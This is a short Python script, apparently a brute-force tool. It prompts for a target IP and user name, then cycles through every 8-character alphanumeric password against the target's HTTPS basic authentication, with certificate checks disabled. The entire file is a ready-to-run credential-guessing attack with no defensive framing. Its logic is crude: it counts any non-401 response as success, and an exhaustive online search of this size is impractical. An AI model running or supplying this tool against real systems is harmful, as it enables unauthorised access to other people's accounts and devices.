import requests
import string
import itertools
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


def auth(ip, user, passwd):
	r = requests.get(ip, auth=(user, passwd), verify=False)
	if r.status_code == 401:
		return False
	return True


IP_ADDR = input("Please Enter target IP : ")
USER_NAME = input("Please Enter user name : ")

chars = string.ascii_letters + string.digits

for password in itertools.product(chars, repeat=8):
	password = "".join(password)
	print("Try: " + password + " (Press Ctrl + C to stop.)")
	if auth("https://" + IP_ADDR, USER_NAME, password):
		print("Success: " + password)
		break
